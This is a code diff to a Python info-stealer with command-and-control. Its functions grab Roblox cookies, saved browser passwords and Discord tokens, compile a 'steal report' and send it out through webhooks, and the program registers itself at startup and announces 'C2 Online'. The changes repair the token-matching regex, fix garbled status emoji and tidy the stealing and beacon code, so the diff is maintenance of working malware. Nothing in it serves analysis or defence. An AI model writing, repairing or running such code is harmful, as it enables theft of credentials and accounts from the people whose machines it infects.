@@ -126,8 +126,8 @@ def _ensure_channels():
 
 def _route_channel(content, embed=None, file_path=None):
     if content:
-        if "âŒ" in content: return "offline"
-        if any(w in content.lower() for w in ["starting", "complete", "âœ…"]): return "online"
+        if "❌" in content: return "offline"
+        if any(w in content.lower() for w in ["starting", "complete", "✅"]): return "online"
     if embed:
         title = embed.get("title", "")
         if "IP" in title or "Geolocation" in title: return "online"
@@ -371,7 +371,7 @@ class CookieGrabber:
                 try:
                     with open(os.path.join(path, fname), "r", errors="ignore") as f:
                         for line in f:
-                            for m in re.findall(r'[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}', line):
+                            for m in re.findall(r'[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}', line):
                                 m = m.rstrip("\\")
                                 if m not in tokens: tokens.append(m)
                 except: pass
@@ -499,7 +499,9 @@ def cmd_rbxcookie(grabber):
 
 def cmd_steal(grabber):
     try:
-        grabber.grab_cookies("roblox.com"); pw = grabber.grab_passwords(); tokens = grabber.grab_tokens()
+        grabber.grab_cookies("roblox.com")
+        pw = grabber.grab_passwords()
+        tokens = grabber.grab_tokens()
         lines = [f"STEAL REPORT - {socket.gethostname()} - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", "="*70]
         lines.append(f"\nRoblox Cookies: {len(grabber.roblox_cookies or [])}")
         for c in grabber.roblox_cookies or []: lines.append(f"  [{c['browser'].upper()}] {c['name']}")
@@ -509,7 +511,8 @@ def cmd_steal(grabber):
         lines.append(f"\nDiscord Tokens: {len(tokens)}")
         for t in tokens: lines.append(f"  {t}")
         send_txt_file("steal_report", "\n".join(lines), "Steal report attached")
-    except Exception as e: send_webhook(content=f"Steal failed: {e}")
+    except Exception as e:
+        send_webhook(content=f"Steal failed: {e}")
 
 def cmd_dumpall(grabber): cmd_steal(grabber)
 
@@ -784,7 +787,8 @@ def main():
         write_pid(); _ensure_channels(); _add_startup()
         threading.Thread(target=watchdog, daemon=True).start()
         threading.Thread(target=auto_check_roblox, daemon=True).start()
-        send_webhook(content=f"🟢 **C2 Online** `{socket.gethostname()}`"); send_webhook(content=f"🟢 **C2 Online** `{socket.gethostname()}`", channel="cmds" if "cmds" in CHANNELS else "main"); cmd_worker()
+        send_webhook(content=f"🟢 **C2 Online** `{socket.gethostname()}`")
+        cmd_worker()
     except: pass
 
 if __name__ == "__main__":
